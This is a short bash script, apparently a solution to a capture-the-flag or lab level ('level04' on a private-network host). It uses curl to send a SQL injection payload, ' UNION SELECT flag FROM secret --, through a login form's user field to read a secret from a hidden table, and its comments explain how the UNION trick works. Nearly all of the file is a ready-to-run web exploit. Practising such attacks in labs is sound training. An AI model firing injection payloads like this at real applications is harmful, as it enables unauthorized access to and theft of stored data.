#! /usr/bin/env bash

# Inject code to close the select statement (this one will not return anything) then use the union statement to
# to inject another select statement that retrieves the secret from the hidden table. The server then displays the
# secret as if it was the user's name.
curl --data "user=' UNION SELECT flag FROM secret -- " --data "pass=a" http://10.0.23.24:8004/level04/index.php